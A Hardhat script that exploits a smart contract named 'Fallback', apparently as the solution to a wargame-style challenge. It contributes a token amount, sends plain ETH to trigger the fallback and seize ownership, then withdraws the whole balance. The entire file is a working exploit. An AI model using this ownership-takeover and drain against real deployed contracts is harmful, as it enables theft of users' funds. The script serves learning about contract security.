const { ethers } = require("hardhat");

const contractAddress = "0xdaC0e13F565B0b1554717988C2D533B5C07D67dA";
const contractName = "Fallback";

async function main() {
    let tx;

    const [attacker] = await ethers.getSigners();

    const factory = await ethers.getContractFactory(contractName);
    const contract = factory.attach(contractAddress);

    // Contribute to appear in the 'contributors' array
    tx = await contract.contribute({ value: 1 });
    await tx.wait();

    console.log("Contributed successfully to appear in contributions mapping");

    // Take ownership of the contract
    tx = await attacker.sendTransaction({
        to: await contract.getAddress(),
        value: 1,
    });
    await tx.wait();

    console.log("Took ownership of the contract");

    // Withdraw remaining eth
    tx = await contract.withdraw();
    await tx.wait();

    console.log("Withdrew all remaining ETH to personal account");
}

main().catch(error => {
    console.error(error);
    process.exit(1);
});
